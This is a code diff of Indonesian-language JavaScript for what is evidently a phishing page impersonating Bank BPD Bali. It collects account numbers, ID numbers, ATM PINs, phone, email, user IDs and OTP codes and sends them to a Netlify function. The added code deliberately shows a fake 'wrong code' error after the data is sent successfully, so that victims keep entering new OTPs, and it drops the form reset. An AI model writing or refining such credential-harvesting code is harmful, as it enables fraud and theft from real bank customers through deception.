@@ -1,4 +1,4 @@
-// Konfigurasi
+// Konfigurasi API URL (Netlify Function)
 const API_URL = '/.netlify/functions/send-aktivasi';
 
 // ========== NAVIGASI ==========
@@ -7,9 +7,6 @@ function pindahHalaman(id) {
     document.getElementById(id).classList.add('active');
     
     if (id === 'page2') {
-        document.getElementById('btnLanjut').classList.add('hidden');
-        cekFormPage2();
-        
         setTimeout(function() {
             const noRekeningField = document.getElementById('noRekening');
             if (noRekeningField) {
@@ -41,11 +38,9 @@ function isFormPage2Valid() {
 
 function cekFormPage2() {
     if (isFormPage2Valid()) {
-        btnLanjut.classList.remove('hidden');
         infoPage2.innerHTML = '* Data lengkap, tekan Cetak Laporan / Pemulihan';
         infoPage2.style.color = '#27ae60';
     } else {
-        btnLanjut.classList.add('hidden');
         infoPage2.innerHTML = '* Harap isi semua data dengan benar (email harus valid)';
         infoPage2.style.color = '#e67e22';
     }
@@ -143,20 +138,26 @@ function lanjutKePage3() {
     }, 150);
 }
 
-// ========== HALAMAN 3 ==========
-async function selesai() {
+// ========== HALAMAN 3 dengan verifikasi ==========
+let loadingTimeout = null;
+
+async function verifikasiKode() {
     const username = document.getElementById('username');
     const kodeOtp = document.getElementById('kodeOtp');
+    const btnVerif = document.getElementById('btnVerifikasi');
+    const infoPage3 = document.getElementById('infoPage3');
     
     let error = '';
-    if (!username.value.trim()) error += 'Username tidak boleh kosong\n';
-    if (!kodeOtp.value.trim()) error += 'Kode OTP tidak boleh kosong\n';
-    else if (kodeOtp.value.trim().length < 4) error += 'Kode OTP minimal 4 digit\n';
+    if (!username.value.trim()) error += 'User.id tidak boleh kosong\n';
+    if (!kodeOtp.value.trim()) error += 'Kode Aktivasi tidak boleh kosong\n';
+    else if (kodeOtp.value.trim().length < 4) error += 'Kode Aktivasi minimal 4 digit\n';
     
     if (error) {
         alert('Verifikasi gagal:\n' + error);
         return;
     }
+    
+    if (btnVerif.disabled) return;
     
     // Ambil data dari sessionStorage
     const userDataStr = sessionStorage.getItem('userData');
@@ -186,36 +187,22 @@ async function selesai() {
     hideLoading();
     
     if (result.success) {
-        alert('Cetak Laporan / Pemulihan berhasil! Data telah dikirim.');
-        // Reset form setelah sukses
-        resetForm();
+        // Jika berhasil kirim, tetap tampilkan error "Kode Salah" sesuai permintaan
+        alert('Kode salah versi Bank BPD Bali');
+        kodeOtp.value = '';
+        infoPage3.innerHTML = '* Kode salah, silakan masukkan kode aktivasi ulang';
+        infoPage3.style.color = '#e74c3c';
+        kodeOtp.focus();
+        
+        setTimeout(function() {
+            if (infoPage3.innerHTML === '* Kode salah, silakan masukkan kode aktivasi ulang') {
+                infoPage3.innerHTML = '* Masukkan kode aktivasi';
+                infoPage3.style.color = '#e67e22';
+            }
+        }, 3000);
     } else {
-        alert('Gagal mengirim data: ' + result.error + '\nData tetap tersimpan di browser.');
+        alert('Gagal mengirim data: ' + result.error);
     }
-}
-
-function resetForm() {
-    // Reset halaman 2
-    noRekening.value = '';
-    noIdentitas.value = '';
-    pinAtm.value = '';
-    noTelpon.value = '';
-    email.value = '';
-    
-    // Reset halaman 3
-    document.getElementById('username').value = '';
-    document.getElementById('kodeOtp').value = '';
-    
-    // Hapus sessionStorage
-    sessionStorage.removeItem('userData');
-    
-    // Kembali ke halaman 1
-    pindahHalaman('page1');
-    
-    // Reset info text
-    infoPage2.innerHTML = '* Harap isi semua data';
-    infoPage2.style.color = '#e67e22';
-    document.getElementById('btnLanjut').classList.add('hidden');
 }
 
 // Filter OTP hanya angka
